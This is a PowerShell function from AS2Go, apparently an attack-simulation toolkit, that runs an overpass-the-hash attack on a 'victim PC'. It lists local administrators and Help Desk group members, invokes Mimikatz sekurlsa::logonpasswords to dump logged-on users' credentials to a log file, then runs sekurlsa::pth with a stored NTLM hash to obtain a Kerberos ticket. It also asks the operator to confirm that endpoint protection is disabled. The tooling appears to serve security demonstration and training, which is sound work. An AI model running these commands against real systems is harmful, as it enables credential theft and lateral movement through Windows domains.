<#
.SYNOPSIS
Runs the AS2Go overpass-the-hash (PtH) attack by reusing a captured NTLM hash on the victim PC.

.DESCRIPTION
Enumerates local administrators and the configured Help Desk group on the victim PC to identify privileged accounts.
Dumps credentials of recently logged-on users on the victim PC with Mimikatz into a session log file.
Confirms the compromised Help Desk user and the captured NTLM hash, and offers corrections before execution.
Launches Mimikatz sekurlsa::pth in a new command window and shows the command required in that window.

.EXAMPLE
Invoke-OverPassTheHashAttack
Runs this workflow using the initialized AS2Go module configuration.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.
Requires the configured Help Desk user, the stored NTLM hash, and Mimikatz in the module tools folder.
Intended to run on the victim PC where credentials of recently logged-on users can be dumped.

.COMPONENT
Category: Main Function

.FUNCTIONALITY
Lists local administrators and the configured Help Desk group to find a privileged account on the victim PC.
Dumps recently logged-on credentials with Mimikatz and confirms the compromised user and NTLM hash.
Launches Mimikatz sekurlsa::pth so the stolen hash yields a Kerberos ticket in a new command window.
#>
function Invoke-OverPassTheHashAttack {

   
    $Info = Measure-FunctionRuntime -Begin

    Update-WindowTitle -NewTitle "Overpass-the-Hash (PtH) Attack"
    Set-ASConfig -Setting "LastStage" -Value "Overpass-the-Hash (PtH) Attack"

    If (-not $SkipClearHost) { Clear-Host }

    Write-AS2GoOutput -Type Header -Message "Starting Pass-the-Hash (PtH) Attack on VictimPC"
    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)


    $title = "Is the Victim PC ready for the OverPass-the-Hash (PtH) attack?"
$message = "Please confirm that the following prerequisites are met:`n  • Endpoint protection is disabled in the test environment.`n  • Fresh Kerberos tickets are available on the Admin PC."

# Default index must stay valid for both cases: last option ("Yes" if present, otherwise "Skip").
$decision = Show-DecisionPrompt -Message $message -Options $Options -Default ($Options.Count - 1) -Title $title

    Write-AS2GoOutput -Type Header -Message "Try to Find a Privileged Account"
    Write-AS2GoOutput -Type Info -Message "For example a member of the Help Desk group." -NoExtraLines
    
    Write-AS2GoOutput -Type NextCommand -Message "Command:" -NoExtraLines -NoNewLine
    Write-Highlight -Text "Get-LocalGroupMember ", "-Group ", """Administrators""", " |", " Format-Table" `
        -Color    $fgcC, $fgcS, $fgcV, $fgcS, $fgcC
    Write-Host ""
    
    Write-AS2GoOutput -Type Command -Message "Get-LocalGroupMember -SID S-1-5-32-544 | Format-Table"
    
    
    Write-Host ""
    Get-LocalGroupMember -Group "Administrators" | Format-Table
    Write-Host ""
    Write-Host ""
    Write-AS2GoOutput -Type NextCommand -Message "Command:" -NoExtraLines -NoNewLine
    Write-Highlight -Text "Get-ADGroupMember ", "-Identity ", $Script:ASHelpDesk, " -Recursive |", " Format-Table" `
        -Color    $fgcC, $fgcS, $fgcV, $fgcS, $fgcC  
    Write-Host ""
    If ($null -eq $Script:ASFQDN) {
        $Script:ASFQDN = Get-ASConfig -Setting "fqdn"
    }

    Try {
        $helpDeskGroup = Get-ADGroup -Server $Script:ASFQDN -Identity $Script:ASHelpDesk -ErrorAction Stop
        Get-PrivilegeGroupMember -Group ([pscustomobject]@{ FQDN = $Script:ASFQDN; SID = $helpDeskGroup.SID })
    }
    Catch {
        Write-AS2GoOutput -Type Error -Message "No access to Help Desk group '$($Script:ASHelpDesk)'."
    }

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Show-CurrentPhase -Phase "phase_poi.html"
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }

    Write-AS2GoOutput -Type Header -Message "Try to List All Recently Logged-on User Credentials from VictimPC"
    $logfile = "$Global:ASHelpDeskUser.log"
    Write-AS2GoOutput -Type NextCommand -Message "Command:" -NoExtraLines -NoNewLine
    Write-AS2GoOutput -Type Command -Message ".\mimikatz.exe `"log .\$logfile`" `"privilege::debug`" `"sekurlsa::logonpasswords`" `"exit`""
    Write-Host ""

    $command = @"
    .\mimikatz.exe "log \C:\Users\Public\AS2Go\Exfiltration\pth.log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
"@

Write-AS2GoOutput -Type Command -Message $command
    
    If ($UnAttended) {
        $answer = $Script:Yes       
    }
    else {
        $question = "Would you like to run this step - Y or N? Default "
        $answer = Get-Answer -question $question -defaultValue $Script:Yes
    }

    If ($answer -eq $Script:Yes) {
        #Invoke-Expression -Command:$command
        Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe"  "log $logfile" "privilege::debug" "sekurlsa::logonpasswords" "exit" }
        Invoke-Item ".\$Global:ASHelpDeskUser.log"
        If ($UnAttended) { Start-Sleep 2 } else { Pause }
    }
    else {
        Write-Log "Skipped - Try to Dump Credentials In-Memory from VictimPC"
        return
    }

    Do {
        If (-not $SkipClearHost) { Clear-Host }
        Write-AS2GoOutput -Type Header -Message "overpass-the-Hash 'PtH' attack"
        Write-AS2GoOutput -Type TextMaker -Message "Compromised User Account:" -Tm $Global:ASHelpDeskUser -NoExtraLines
        Write-AS2GoOutput -Type TextMaker -Message "NTLM Hash:" -Tm $Script:ASPtHntml -NoExtraLines
        Write-AS2GoOutput -Type NextCommand -Message "Command:" -NoExtraLines -NoNewLine
        Write-Highlight -Text ".\mimikatz.exe ", """privilege::", "debug", """ ""sekurlsa::", "pth", " /user:", $Global:ASHelpDeskUser , " /ntlm:", $Script:ASPtHntml, " /domain:", $Script:ASFQDN, """ ""exit"""   `
            -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
        Write-Host ""

        If ($UnAttended) {
            $prompt = $Script:Yes
        }
        else {
            $question = "Are these values correct - Y or N? Default "
            $prompt = Get-Answer -question $question -defaultValue $Script:Yes
        }

    
        if ($prompt -ne $Script:Yes) {

            $question = " -> Is this user $Global:ASHelpDeskUser  correct - Y or N? Default "
            $prompt = Get-Answer -question $question -defaultValue $Script:Yes
    
            if ($prompt -ne $Script:Yes) {
                $Global:ASHelpDeskUser = Read-Host "New PtH Victim"
            }
 
  
            $question = " -> Is this NTLH HASH for $Global:ASHelpDeskUser  correct - Y or N? Default "
            $prompt = Get-Answer -question $question -defaultValue $Script:Yes
    
            if ($prompt -ne $Script:Yes) {
                $Script:ASPtHntml = Read-Host "New NTML Hash for $Global:ASHelpDeskUser"
                Set-ASConfig -Setting "pthntml" -Value $Script:ASPtHntml
            }


        }

    } Until ($prompt -eq $Script:Yes)


    Invoke-Command -ScriptBlock { .\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:$Global:ASHelpDeskUser /ntlm:$Script:ASPtHntml /domain:$Script:ASFQDN" "exit" }


    Write-AS2GoOutput -Type Header -Message "Use the New Command Window"
    Write-AS2GoOutput -Type Info -Message "The overpass-the-hash command opened a new command window for the ticket injection."
    Write-AS2GoOutput -Type NextCommand -Message "Please run the following command from the new terminal window" -NoExtraLines
    Write-AS2GoOutput -Type Command -NoExtraLines -Message "00.cmd"

    Stop-Process -ErrorAction SilentlyContinue -Name iexplore -Force 
    Stop-Process -ErrorAction SilentlyContinue -Name msedge -Force 

    Measure-FunctionRuntime -End -Details $Info
    Pause
}
